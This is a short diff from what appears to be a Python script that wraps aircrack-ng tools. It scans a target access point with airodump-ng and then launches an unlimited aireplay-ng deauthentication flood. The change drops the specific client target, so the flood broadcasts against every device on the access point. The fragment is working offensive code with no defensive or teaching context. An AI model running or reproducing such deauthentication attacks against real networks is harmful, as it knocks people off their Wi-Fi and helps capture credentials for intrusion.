@@ -24,6 +24,6 @@ os.system('airodump-ng -c {0} --bssid {1} {2}'.format(chan,bssidi,interm))
 print(bssidi)
 print(chan)
 print(interm)
-os.system('aireplay-ng -0 0 -c {0} -a {1} {2}'.format(chan,bssidi,interm))
+os.system('aireplay-ng -0 0  -a {0} {1}'.format(bssidi,interm))
 
 
